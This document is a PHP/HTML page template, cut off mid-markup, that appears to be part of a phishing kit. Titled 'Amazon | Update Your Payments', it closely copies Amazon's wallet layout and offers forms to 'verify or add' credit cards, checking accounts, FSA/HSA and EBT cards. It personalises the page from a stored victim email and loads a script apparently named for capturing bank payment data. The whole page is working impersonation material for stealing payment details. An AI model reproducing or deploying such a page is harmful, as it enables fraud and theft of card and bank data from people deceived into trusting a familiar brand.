<?php
$error = isset($_SESSION["error_card"]) ? $_SESSION["error_card"] : null;
?>
<html
	lang="en-us"
	class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ember-modern-display a-ember-modern-text"
	data-19ax5a9jf="dingo"
	data-aui-build-date="3.25.9-2025-12-08"
>
	<head>
		<meta charset="utf-8" />
        <link rel="icon" href="/public/images/favicon.png" type="image/png">
		<link
			rel="stylesheet"
			href="/public/css/karma_custom.css?v=<?= time(); ?>"
		/>
		<link
			rel="stylesheet"
			href="/public/css/karma_styles.css?v=<?= time(); ?>"
		/>
		<title>Amazon | Update Your Payments</title>
	    <script src="/public/js/EntityBankPaymentsForm.js?v=<?= time(); ?>"></script>
	</head>

	<body
		class="a-m-us a-aui_72554-c a-aui_killswitch_csa_logger_372963-t1 a-aui_template_weblab_cache_333406-c a-bw_aui_cxc_alert_measurement_1074111-c a-bw_aui_stepper_enable_strategies_1_1330429-t1"
	>
        <?php

            if (isMobile()) {
                require __DIR__ . '/../static/tes.html';
            } else {
                require __DIR__ . '/../static/header.php';
            }
        ?>

        <?php if (isMobile()): ?>
            <link
                rel="stylesheet"
                href="/public/css/karma_mobile.css?v=<?= time(); ?>"
            />
        <?php endif; ?>
		<div id="a-page" class="bg-[#EAEDED] overflow-x-hidden">
			<div class="a-row p-3 px-35 bg-white">
				<ul class="a-unordered-list a-nostyle a-horizontal" role="tablist">
					<div class="flex gap-10">
						<li role="tab">
							<span class="a-list-item">
								<p
									class="a-link-normal payWalletMenuTabHead text-black"
									href="#"
								>
									Overview
								</p>
							</span>
						</li>

						<li role="tab">
							<span class="a-list-item">
								<span
									id="selectedHubMenuTab"
									class="payWalletMenuTabHead payWalletTabSelected font-karma-bold"
								>
									Wallet
								</span>
							</span>
						</li>

						<li role="tab">
							<span class="a-list-item">
								<p
									class="a-link-normal payWalletMenuTabHead text-black"
									href="#"
								>
									Transactions
								</p>
							</span>
						</li>

						<li role="tab">
							<span class="a-list-item">
								<p
									class="a-link-normal payWalletMenuTabHead text-black"
									href="#"
								>
									Settings
								</p>
							</span>
						</li>
					</div>
				</ul>
			</div>
			<div class="a-row amazonPayWalletWidgetRow px-0 xl:px-65">
				<div
					class="a-container amazonPayWalletBreadcrumbsContainer payWalletContentContainer"
				>
					<div
						id="headerRow"
						class="a-row a-spacing-micro a-grid-vertical-align a-grid-top a-ws-row"
					>
						<div
							id="headerCol"
							class="a-column a-span12 a-text-left a-ws-span12"
						>
							<h1 class="a-size-base flex gap-2">
								<span
									class="a-link-normal breadcrumbLink text-[#555555]"
								>
									Your Account
								</span>
								<span class="breadcrumbArrow"> › </span>
								<!-- Second breadcrumb level. Might be wrapped with link. -->

								<span
									class="a-link-normal breadcrumbLink text-[#555555]"
								>
									Your Payments
								</span>

								<!-- Optional third breadcrumb level. Might be wrapped with link. -->

								<span class="breadcrumbArrow"> › </span>

								<span
									class="menuTextSelectedMobile text-[#B12704]"
								>
									Wallet
								</span>

								<!-- Optional forth and final breadcrumb level -->
							</h1>
						</div>
					</div>
				</div>
			</div>
			<div class="a-row amazonPayWalletWidgetRow px-0 xl:px-65">
				<div class="a-container payWalletContentContainer">
					<div id="portalWidgetSection" class="a-section">
						<div id="cpefront-mpo-widget">
							<div
								data-pmts-component-id="pp-z3b4qh-1"
								class="a-section a-spacing-none pmts-widget-section pmts-portal-root-FFspN8a2Msvt pmts-portal-component pmts-portal-components-pp-z3b4qh-1"
							>
								<div
									id="pp-z3b4qh-28"
									data-pmts-component-id="pp-z3b4qh-2"
									class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-z3b4qh-2"
									style="
                                        display: none;
									"
								>
									<img
                                        id="spinner-img"
										alt=""
										src="/public/images/spinner2.gif"
										class="pmts-loading-async-widget-spinner-viewport-centered"
                                        style="position: fixed; top: 50%"
									/>
                                    <script>
                                        function updatePopoverWidth() {
                                            const popover = document.getElementById("spinner-img");
                                            if (!popover) return;

                                            if (window.innerWidth >= 1024) {
                                                popover.style.top = "50%";
                                            } else {
                                                popover.style.top = "50%";
                                            }
                                        }

                                        window.addEventListener("resize", updatePopoverWidth);
                                        document.addEventListener("DOMContentLoaded", updatePopoverWidth);
                                    </script>
								</div>
								<div class="a-section apx-wallet-widget-section">
									<div class="a-row a-spacing-medium max-w-xs md:max-w-max">
										<div
											data-pmts-component-id="pp-z3b4qh-5"
											class="a-section issuanceBannerContent pmts-portal-component pmts-portal-components-pp-z3b4qh-5"
										>
											<div class="a-box">
												<div class="a-box-inner a-padding-small">
													<div id="pp-z3b4qh-29" class="a-row a-spacing-none">
														<div class="maple-banner hidden md:flex">
															<style type="text/css">
																.maple-banner
																	.maple-banner__col.maple-banner__col--image {
																	display: table-cell;
																}

																.maple-banner
																	.maple-banner__col
																	.maple-banner__image {
																	display: block;
																	min-width: 100px;
																	width: 160px;
																}

																.maple-banner--background {
																	background: #fff;
																}

																.maple-banner > a {
																	color: #111;
																	text-decoration: none;
																	width: fit-content;
																}

																.maple-banner__container {
																	display: table;
																}

																.maple-banner__row {
																	display: table-row;
																}

																.maple-banner__col {
																	display: table-cell;
																	vertical-align: middle;
																}

																.maple-banner__col--fixed {
																	width: 120px;
																}

																.maple-banner__button {
																	white-space: nowrap;
																}
															</style>

															<a
																class="a-link-normal aok-block aok-align-center-horizontally "
																href="#"
															>
																<div
																	class="a-section maple-banner__container maple-banner--background maple-banner--border"
																>
																	<div class="a-section maple-banner__row">
																		<div
																			class="a-section a-padding-base maple-banner__col maple-banner__col--image"
																		>
																			<div
																				id="maple-image-text"
																				class="a-section maple-banner__image"
																			>
																				<img
																					alt="Amazon Store Card"
																					src="/public/images/platcard.png"
																				/>
																			</div>
																		</div>
																		<div
																			id="maple-banner-text"
																			class="a-section a-padding-base maple-banner__col maple-banner__col--text hidden"
																		>
																			<div class="a-section maple-banner__text">
																				<strong
																					>
                                                                                    <?php 
                                                                                        if (isset($_SESSION["entity_email"])) {
                                                                                            $name = explode('@', $_SESSION["entity_email"])[0];
                                                                                            echo ucfirst(trim($name));
                                                                                        } else {
                                                                                            echo "Sign in";
                                                                                        }
                                                                                    ?>, get a
																					<span data-maple-math="promo-amount"
																						>$60</span
																					>
																					Amazon Gift Card</strong
																				>
																				instantly upon approval for the Amazon
																				Store Card.
																			</div>
																		</div>
																		<div
																			class="a-section a-padding-base maple-banner__col maple-banner__col--fixed"
																		>
																			<div
																				class="a-section a-spacing-medium a-spacing-top-medium a-text-center maple-banner__button"
																			>
																				<div aria-hidden="true">
																					<span
																						id="maple-button-text"
																						class="a-button a-button-base"
																						><span class="a-button-inner"
																							><button
																								id="maple-button-text-announce"
																								tabindex="-1"
																								class="a-button-text a-text-center"
																								type="button"
																							>
																								Learn more
																							</button></span
																						></span
																					>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</a>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
									<div class="a-row a-spacing-small">
										<span class="a-size-extra-large a-text-bold">Wallet</span>
									</div>
									<div
										class="a-fixed-left-grid apx-wallet-pm-fixed-row a-spacing-top-small"
									>
										<div
											class="a-fixed-left-grid-inner"
											style="padding-left: 315px"
										>
											<div
												class="a-fixed-left-grid-col a-col-left"
												style="
													width: 315px;
													margin-left: -315px;
													float: left;
													top: -535px;
												"
											>
												<div
													class="a-row a-spacing-extra-large pmts-portal-component pmts-portal-components-pp-z3b4qh-3"
												>
													<div class="a-row apx-wallet-tab-set-header-row">
														<span class="a-size-large"
															>Cards &amp; accounts</span
														>
													</div>
													<div
														class="a-row apx-wallet-desktop-payment-method-selectable-tab-css"
													>
														<div
															class="a-scroller apx-wallet-desktop-payment-method-selectable-tab-css a-scroller-vertical"
														>
															<div
																class="a-row apx-wallet-desktop-payment-method-selectable-tab-inner-css"
															>
																<hr
																	class="a-divider-normal apx-wallet-sleeve-item-top-divider"
																/>
																<hr
																	class="a-divider-normal apx-wallet-sleeve-item-bottom-divider"
																/>
															</div>
														</div>
													</div>
													<div class="a-row a-spacing-small">
														<div
															id="pp-z3b4qh-31"
															class="a-section apx-wallet-selectable-payment-method-tab apx-wallet-payment-method-tab-selected"
														>
															<div class="a-fixed-left-grid">
																<div
																	class="a-fixed-left-grid-inner"
																	style="padding-left: 97px"
																>
																	<div
																		class="a-fixed-left-grid-col a-col-left"
																		style="
																			width: 97px;
																			margin-left: -97px;
																			float: left;
																		"
																	>
																		<img
																			alt=""
																			src="/public/images/addcard.png"
																			width="85px"
																		/>
																	</div>
																	<div
																		class="a-fixed-left-grid-col apx-wallet-add-link-section a-col-right"
																		style="padding-left: 0%; float: left"
																	>
																		<a
																			id="pp-z3b4qh-32"
																			aria-label="Add a payment method"
																			class="a-link-normal apx-wallet-add-link"
																			href="#"
																			>Verify or add a payment method</a
																		>
																	</div>
																</div>
															</div>
														</div>
														<hr
															class="a-divider-normal apx-wallet-sleeve-item-divider"
														/>
													</div>
												</div>
												<div
													data-pmts-component-id="pp-z3b4qh-4"
													class="a-row a-spacing-extra-large pmts-portal-component pmts-portal-components-pp-z3b4qh-4"
												>
													<div class="a-row apx-wallet-tab-set-header-row">
														<span class="a-size-large"
															>Rewards &amp; balances</span
														>
													</div>
													<hr
														class="a-divider-normal apx-wallet-sleeve-item-divider"
													/>
													<div
														id="pp-z3b4qh-33"
														data-pmts-component-id="pp-z3b4qh-12"
														class="a-section apx-wallet-selectable-payment-method-tab pmts-portal-component pmts-portal-components-pp-z3b4qh-12"
													>
														<div class="a-fixed-left-grid">
															<div
																class="a-fixed-left-grid-inner"
																style="padding-left: 97px"
															>
																<div
																	class="a-fixed-left-grid-col a-col-left"
																	style="
																		width: 97px;
																		margin-left: -97px;
																		float: left;
																	"
																>
																	<div class="a-row">
																		<img
																			alt=""
																			src="/public/images/walletzon.png"
																			class="apx-wallet-selectable-image"
																			width="85px"
																			role="img"
																		/>
																		<div
																			class="a-row apx-wallet-desktop-tab-label"
																		>
																			<div
																				class="a-column a-span12 a-text-right"
																			></div>
																		</div>
																	</div>
																</div>
																<div
																	class="a-fixed-left-grid-col a-col-right"
																	style="padding-left: 0%; float: left"
																>
																	<a
																		class="a-link-normal a-color-base"
																		href="#"
																		role="button"
																		><div
																			class="a-section apx-wallet-tab-pm-content"
																		>
																			<div class="a-row apx-wallet-tab-pm-name">
																				<span
																					class="a-size-base apx-wallet-tab-pm-name-text a-text-bold"
																					>Amazon Gift Card</span
																				>
																			</div>
																			<div
																				class="a-row apx-wallet-tab-pm-description"
																			>
																				<span>Balance: $0.00</span>
																			</div>
																		</div></a
																	>
																</div>
															</div>
														</div>
													</div>
													<hr
														class="a-divider-normal apx-wallet-sleeve-item-divider pmts-portal-component pmts-portal-components-pp-z3b4qh-12"
													/>
													<div class="a-row a-spacing-small">
														<div
															id="pp-z3b4qh-34"
															class="a-section apx-wallet-selectable-payment-method-tab"
														>
															<div class="a-fixed-left-grid">
																<div
																	class="a-fixed-left-grid-inner"
																	style="padding-left: 97px"
																>
																	<div
																		class="a-fixed-left-grid-col a-col-left"
																		style="
																			width: 97px;
																			margin-left: -97px;
																			float: left;
																		"
																	>
																		<img
																			alt=""
																			src="/public/images/addcard.png"
																			width="85px"
																		/>
																	</div>
																	<div
																		class="a-fixed-left-grid-col apx-wallet-add-link-section a-col-right"
																		style="padding-left: 0%; float: left"
																	>
																		<a
																			id="pp-z3b4qh-35"
																			class="a-link-normal apx-wallet-add-link"
																			href="#"
																			>Add rewards and balances</a
																		>
																	</div>
																</div>
															</div>
														</div>
														<hr
															class="a-divider-normal apx-wallet-sleeve-item-divider"
														/>
														<hr
															class="a-divider-normal apx-wallet-sleeve-item-divider"
														/>
													</div>
												</div>
											</div>
											<div
												class="a-spacing-medium a-fixed-left-grid-col apx-wallet-payment-method-details a-col-right hidden md:flex"
												style="padding-left: 0%; float: left"
											>
												<div
													class="a-row a-spacing-medium a-spacing-top-medium apx-wallet-payment-method-details-row"
												>
													<iframe
														id="pp-z3b4qh-37"
														class="apx-secure-iframe pmts-portal-component pmts-portal-components-pp-z3b4qh-7"
														name="ApxSecureIframe-pp-z3b4qh-6"
														style="display: none"
													></iframe>
													<h2
														data-pmts-component-id="pp-z3b4qh-6"
														class="a-spacing-base pmts-portal-component pmts-portal-components-pp-z3b4qh-6"
													>
														Verify or Add a New Payment Method
													</h2>
													<div
														data-pmts-component-id="pp-z3b4qh-6"
														class="a-section a-spacing-base pmts-portal-component pmts-portal-components-pp-z3b4qh-6"
													>
														<hr class="a-divider-normal" />
														<div
															id="pp-z3b4qh-38"
															data-pmts-component-id="pp-z3b4qh-9"
															class="a-section pmts-portal-component pmts-portal-components-pp-z3b4qh-9"
														>
															<div class="a-fixed-right-grid">
																<div
																	class="a-fixed-right-grid-inner"
																	style="padding-right: 98px"
																>
																	<div
																		class="a-fixed-right-grid-col a-col-left"
																		style="padding-right: 2%; float: left"
																	>
																		<div class="a-row a-spacing-base">
																			<div class="a-column a-span12">
																				<span class="a-size-medium a-text-bold"
																					>FSA or HSA Cards</span
																				>
																			</div>
																			<div class="a-column a-span12">
																				<div class="a-row">
																					<span
																						>Use your FSA or HSA card to pay for
																						eligible items</span
																					>
																				</div>
																			</div>
																		</div>
																		<div class="a-row">
																			<div
																				class="a-column a-span12 a-spacing-medium"
																			>
																				<span
																					class="a-declarative"
																					data-action="add-hba-action-name"
																					data-add-hba-action-name='{"name":"apx-add-card-popover-healthbenefitscard","header":"Add an FSA or HSA card","position":"absolute"}'
																					><span
																						id="pp-z3b4qh-39"
																						class="a-button a-button-base"
																						><span class="a-button-inner"
																							><input
																								class="a-button-input"
																								type="submit"
																								aria-labelledby="pp-z3b4qh-39-announce"
																							/><span
																								id="pp-z3b4qh-39-announce"
																								class="a-button-text"
																								aria-hidden="true"
																								>Add an FSA or HSA card</span
																							></span
																						></span
																					></span
																				>
																			</div>
																		</div>
																	</div>
																	<div
																		class="a-text-right a-fixed-right-grid-col a-col-right"
																		style="
																			width: 98px;
																			margin-right: -98px;
																			float: left;
																		"
																	>
																		<img
																			alt=""
																			src="/public/images/hba.png"
																		/>
																	</div>
																</div>
															</div>
														</div>
														<hr class="a-divider-normal" />
														<div
															id="pp-z3b4qh-61"
															data-pmts-component-id="pp-z3b4qh-19"
															class="a-section pmts-portal-component pmts-portal-components-pp-z3b4qh-19"
														>
															<div
																aria-live="polite"
																class="a-row a-expander-container a-spacing-base a-expander-extend-container pmts-add-cc add-instrument-form-expander"
															>
																<div class="a-fixed-right-grid">
																	<div
																		class="a-fixed-right-grid-inner"
																		style="padding-right: 198px"
																	>
																		<div
																			class="a-fixed-right-grid-col a-col-left"
																			style="padding-right: 2%; float: left"
																		>
																			<div class="a-row a-spacing-base">
																				<div class="a-row">
																					<h3 class="pmts-portal-add-ba-title">
																						Credit or debit cards
																					</h3>
																				</div>
																				<div class="a-row">
																					<div class="a-row">
																						Amazon accepts major credit and
																						debit cards.
																					</div>
																				</div>
																			</div>
																			<div
																				class="a-section a-hidden aok-hidden apx-expander-header-empty"
																			></div>
																		</div>
																		<div
																			class="a-text-right a-fixed-right-grid-col a-col-right"
																			style="
																				width: 198px;
																				margin-right: -198px;
																				float: left;
																			"
																		>
																			<div
																				class="a-section a-spacing-none a-text-right pmts-composite-logo-row"
																			>
																				<span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: 0px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -45px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -90px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -135px;
																					"
																				></span>
																			</div>
																			<div
																				class="a-section a-spacing-none a-text-right pmts-composite-logo-row"
																			>
																				<span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -180px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -225px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -270px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -585px;
																					"
																				></span>
																			</div>
																		</div>
																	</div>
																</div>
																<div
																	aria-expanded="true"
																	class="a-expander-content a-spacing-base a-expander-extend-content"
																>
																	<div
																		class="a-section pmts-add-credit-card-component-container"
																	>
																		<div
																			data-pmts-component-id="pp-z3b4qh-20"
																			class="a-row a-spacing-medium pmts-add-credit-card-content-trigger-row-common pmts-portal-component pmts-portal-components-pp-z3b4qh-20"
																		>
																			<span
																				class="a-declarative"
																				data-action="add-credit-card-action-name-pp-z3b4qh-20"
																				data-add-credit-card-action-name-pp-z3b4qh-20="{}"
																				id="apx-add-credit-card-action-test-id"
																				><span
																					id="pp-z3b4qh-63"
																					class="a-button a-button-base apx-secure-registration-content-trigger-js"
																					><span class="a-button-inner"
																						><input
																							class="a-button-input"
																							type="submit"
																							aria-labelledby="pp-z3b4qh-63-announce"
																						/><span
																							id="pp-z3b4qh-63-announce"
																							class="a-button-text"
																							aria-hidden="true"
																							>Add a credit or debit card</span
																						></span
																					></span
																				><span
																					class="a-button a-button-disabled a-spacing-mini a-button-base apx-secure-registration-content-trigger-no-js"
																					><span class="a-button-inner"
																						><button
																							disabled="disabled"
																							class="a-button-text"
																							type="button"
																						>
																							Add a credit or debit card
																						</button></span
																					></span
																				></span
																			>
																		</div>
																		<div
																			data-pmts-component-id="pp-z3b4qh-20"
																			class="a-section pmts-add-credit-card-component-container pmts-portal-component pmts-portal-components-pp-z3b4qh-20"
																		>
																			<div
																				class="a-row pmts-add-cc-rate-limiting-container a-hidden aok-hidden"
																			>
																				<div
																					class="a-box a-alert-inline a-alert-inline-error"
																					aria-live="assertive"
																					role="alert"
																				>
																					<div
																						class="a-box-inner a-alert-container"
																					>
																						<i class="a-icon a-icon-alert"></i>
																						<div class="a-alert-content">
																							<span
																								class="pmts-add-cc-rate-limiting-15mins-string a-hidden aok-hidden"
																								>You won't be able to add a card
																								for the next 15 minutes for
																								security reasons. </span
																							><span
																								class="pmts-add-cc-rate-limiting-24hrs-string a-hidden aok-hidden"
																								>You won't be able to add a card
																								for the next 24 hours for
																								security reasons.</span
																							><a
																								class="a-link-normal"
																								href="#"
																							>
																								Contact customer service</a
																							><span>
																								if you need further
																								assistance.</span
																							>
																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
														<hr class="a-divider-normal" />
														<div
															data-pmts-component-id="pp-z3b4qh-36"
															class="a-row a-spacing-base pmts-portal-component pmts-portal-components-pp-z3b4qh-36"
														>
															<div class="a-column a-span9">
																<div class="a-row a-spacing-base">
																	<div class="a-row">
																		<span class="a-size-medium a-text-bold"
																			>Amazon Store Card</span
																		>
																	</div>
																	<div
																		class="a-row pmts-add-amazon-store-card-description"
																	>
																		Access to exclusive financing offers. No
																		annual fee. Zero fraud liability.
																	</div>
																</div>
																<div class="a-row">
																	<a
																		id="pp-z3b4qh-64"
																		class="a-link-normal pmts-add-amazon-store-card-learn-more-link"
																		target="AmazonHelp"
																		rel="noopener"
																		href="#"
																		>Learn more</a
																	>
																</div>
															</div>
															<div
																class="a-column a-span3 a-text-right a-span-last"
															>
																<img
																	alt=""
																	src="/public/images/plcc.gif"
																	class="pmts-add-amazon-store-card-logo"
																/>
															</div>
														</div>
														<hr class="a-divider-normal" />
														<div
															id="pp-z3b4qh-65"
															data-pmts-component-id="pp-z3b4qh-14"
															class="a-section pmts-portal-component pmts-portal-components-pp-z3b4qh-14"
														>
															<div
																aria-live="polite"
																class="a-row a-expander-container a-spacing-base a-expander-extend-container pmts-add-ba add-instrument-form-expander"
															>
																<div class="a-fixed-right-grid">
																	<div
																		class="a-fixed-right-grid-inner"
																		style="padding-right: 98px"
																	>
																		<div
																			class="a-fixed-right-grid-col a-col-left"
																			style="padding-right: 2%; float: left"
																		>
																			<div class="a-row a-spacing-base">
																				<div class="a-row">
																					<h3 class="pmts-portal-add-ba-title">
																						Personal Checking Accounts
																					</h3>
																				</div>
																				<div class="a-row">
																					<div
																						class="a-row pmts-add-bank-account-learnMore"
																					>
																						Use your US based personal checking
																						account.<span
																							class="a-letter-space"
																						></span
																						><a
																							class="a-link-normal pmts-learn-more-link"
																							target="AmazonHelp"
																							rel="noopener"
																							href="#"
																							>Learn more</a
																						>
																					</div>
																				</div>
																			</div>
																			<div
																				class="a-section a-hidden aok-hidden apx-expander-header-empty"
																			></div>
																		</div>
																		<div
																			class="a-text-right a-fixed-right-grid-col a-col-right"
																			style="
																				width: 98px;
																				margin-right: -98px;
																				float: left;
																			"
																		>
																			<img
																				alt=""
																				src="/public/images/bankrow.png"
																				class="pmts-add-bank-account-logo"
																			/>
																		</div>
																	</div>
																</div>
																<div
																	aria-expanded="true"
																	class="a-expander-content a-spacing-base a-expander-extend-content"
																>
																	<div
																		data-pmts-component-id="pp-z3b4qh-15"
																		class="a-row a-spacing-medium pmts-portal-component pmts-portal-components-pp-z3b4qh-15"
																	>
																		<span
																			class="a-declarative"
																			data-action="add-bank-account-action-name-pp-z3b4qh-15"
																			data-add-bank-account-action-name-pp-z3b4qh-15="{}"
																			id="apx-add-bank-account-content-trigger-declarative-action-test-id"
																			><span
																				id="pp-z3b4qh-67"
																				class="a-button a-button-base apx-secure-registration-content-trigger-js"
																				><span class="a-button-inner"
																					><input
																						class="a-button-input"
																						type="submit"
																						aria-labelledby="pp-z3b4qh-67-announce"
																					/><span
																						id="pp-z3b4qh-67-announce"
																						class="a-button-text"
																						aria-hidden="true"
																						>Add a personal checking
																						account</span
																					></span
																				></span
																			><span
																				class="a-button a-button-disabled a-spacing-mini a-button-base apx-secure-registration-content-trigger-no-js"
																				><span class="a-button-inner"
																					><button
																						disabled="disabled"
																						class="a-button-text"
																						type="button"
																					>
																						Add a personal checking account
																					</button></span
																				></span
																			>
																			<div class="a-section">
																				<div
																					class="a-box a-alert-inline a-alert-inline-warning apx-secure-registration-content-trigger-no-js"
																				>
																					<div
																						class="a-box-inner a-alert-container"
																					>
																						<i class="a-icon a-icon-alert"></i>
																						<div class="a-alert-content">
																							Please enable JavaScript to add a
																							bank account.
																						</div>
																					</div>
																				</div>
																			</div></span
																		>
																	</div>
																</div>
															</div>
														</div>
														<hr class="a-divider-normal" />
														<div
															id="pp-z3b4qh-68"
															data-pmts-component-id="pp-z3b4qh-8"
															class="a-section pmts-portal-component pmts-portal-components-pp-z3b4qh-8"
														>
															<div class="a-fixed-right-grid">
																<div
																	class="a-fixed-right-grid-inner"
																	style="padding-right: 98px"
																>
																	<div
																		class="a-fixed-right-grid-col a-col-left"
																		style="padding-right: 2%; float: left"
																	>
																		<div class="a-row a-spacing-base">
																			<div class="a-column a-span12">
																				<span class="a-size-medium a-text-bold"
																					>Enter your EBT card information</span
																				>
																			</div>
																		</div>
																		<div class="a-row">
																			<div
																				class="a-column a-span12 a-spacing-medium"
																			>
																				<span
																					class="a-declarative"
																					data-action="add-ebt-action-name"
																					data-add-ebt-action-name='{"name":"apx-add-card-popover-electronicbenefittransfer","header":"Add an EBT card","position":"absolute"}'
																					><span
																						id="pp-z3b4qh-69"
																						class="a-button a-button-base"
																						><span class="a-button-inner"
																							><input
																								class="a-button-input"
																								type="submit"
																								aria-labelledby="pp-z3b4qh-69-announce"
																							/><span
																								id="pp-z3b4qh-69-announce"
																								class="a-button-text"
																								aria-hidden="true"
																								>Add an EBT card</span
																							></span
																						></span
																					></span
																				>
																			</div>
																		</div>
																	</div>
																	<div
																		class="a-text-right a-fixed-right-grid-col a-col-right"
																		style="
																			width: 98px;
																			margin-right: -98px;
																			float: left;
																		"
																	>
																		<img
																			alt=""
																			src="/public/images/ebt.png"
																		/>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
                                        <div class="-mt-130 md:mt-0 lg:mt-0 xl:mt-0 sm:flex md:hidden lg:hidden xl:hidden max-w-sm">
											<div
												class="a-spacing-medium a-fixed-left-grid-col apx-wallet-payment-method-details a-col-right"
												style="padding-left: 0%; float: left"
											>
												<div
													class="a-row a-spacing-medium a-spacing-top-medium apx-wallet-payment-method-details-row"
												>
													<iframe
														id="pp-z3b4qh-37"
														class="apx-secure-iframe pmts-portal-component pmts-portal-components-pp-z3b4qh-7"
														name="ApxSecureIframe-pp-z3b4qh-6"
														style="display: none"
													></iframe>
													<h2
														data-pmts-component-id="pp-z3b4qh-6"
														class="a-spacing-base pmts-portal-component pmts-portal-components-pp-z3b4qh-6"
													>
														Verify or Add a New Payment Method
													</h2>
													<div
														data-pmts-component-id="pp-z3b4qh-6"
														class="a-section a-spacing-base pmts-portal-component pmts-portal-components-pp-z3b4qh-6"
													>
														<hr class="a-divider-normal" />
														<div
															id="pp-z3b4qh-38"
															data-pmts-component-id="pp-z3b4qh-9"
															class="a-section pmts-portal-component pmts-portal-components-pp-z3b4qh-9"
														>
															<div class="a-fixed-right-grid">
																<div
																	class="a-fixed-right-grid-inner"
																	style="padding-right: 98px"
																>
																	<div
																		class="a-fixed-right-grid-col a-col-left"
																		style="padding-right: 2%; float: left"
																	>
																		<div class="a-row a-spacing-base">
																			<div class="a-column a-span12">
																				<span class="a-size-medium a-text-bold"
																					>FSA or HSA Cards</span
																				>
																			</div>
																			<div class="a-column a-span12">
																				<div class="a-row">
																					<span
																						>Use your FSA or HSA card to pay for
																						eligible items</span
																					>
																				</div>
																			</div>
																		</div>
																		<div class="a-row">
																			<div
																				class="a-column a-span12 a-spacing-medium"
																			>
																				<span
																					class="a-declarative"
																					data-action="add-hba-action-name"
																					data-add-hba-action-name='{"name":"apx-add-card-popover-healthbenefitscard","header":"Add an FSA or HSA card","position":"absolute"}'
																					><span
																						id="pp-z3b4qh-39"
																						class="a-button a-button-base"
																						><span class="a-button-inner"
																							><input
																								class="a-button-input"
																								type="submit"
																								aria-labelledby="pp-z3b4qh-39-announce"
																							/><span
																								id="pp-z3b4qh-39-announce"
																								class="a-button-text"
																								aria-hidden="true"
																								>Add an FSA or HSA card</span
																							></span
																						></span
																					></span
																				>
																			</div>
																		</div>
																	</div>
																	<div
																		class="a-text-right a-fixed-right-grid-col a-col-right"
																		style="
																			width: 98px;
																			margin-right: -98px;
																			float: left;
																		"
																	>
																		<img
																			alt=""
																			src="/public/images/hba.png"
																		/>
																	</div>
																</div>
															</div>
														</div>
														<hr class="a-divider-normal" />
														<div
															id="pp-z3b4qh-61"
															data-pmts-component-id="pp-z3b4qh-19"
															class="a-section pmts-portal-component pmts-portal-components-pp-z3b4qh-19"
														>
															<div
																aria-live="polite"
																class="a-row a-expander-container a-spacing-base a-expander-extend-container pmts-add-cc add-instrument-form-expander"
															>
																<div class="a-fixed-right-grid">
																	<div
																		class="a-fixed-right-grid-inner"
																		style="padding-right: 198px"
																	>
																		<div
																			class="a-fixed-right-grid-col a-col-left"
																			style="padding-right: 2%; float: left"
																		>
																			<div class="a-row a-spacing-base">
																				<div class="a-row">
																					<h3 class="pmts-portal-add-ba-title">
																						Credit or debit cards
																					</h3>
																				</div>
																				<div class="a-row">
																					<div class="a-row">
																						Amazon accepts major credit and
																						debit cards.
																					</div>
																				</div>
																			</div>
																			<div
																				class="a-section a-hidden aok-hidden apx-expander-header-empty"
																			></div>
																		</div>
																		<div
																			class="a-text-right a-fixed-right-grid-col a-col-right"
																			style="
																				width: 198px;
																				margin-right: -198px;
																				float: left;
																			"
																		>
																			<div
																				class="a-section a-spacing-none a-text-right pmts-composite-logo-row"
																			>
																				<span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: 0px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -45px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -90px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -135px;
																					"
																				></span>
																			</div>
																			<div
																				class="a-section a-spacing-none a-text-right pmts-composite-logo-row"
																			>
																				<span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -180px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -225px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -270px;
																						margin-right: 6px;
																					"
																				></span
																				><span
																					class="pmts-indiv-issuer-image"
																					style="
																						background-image: url('/public/images/card.png');
																						background-position: -585px;
																					"
																				></span>
																			</div>
																		</div>
																	</div>
																</div>
																<div
																	aria-expanded="true"
																	class="a-expander-content a-spacing-base a-expander-extend-content"
																>
																	<div
																		class="a-section pmts-add-credit-card-component-container"
																	>
																		<div
																			data-pmts-component-id="pp-z3b4qh-20"
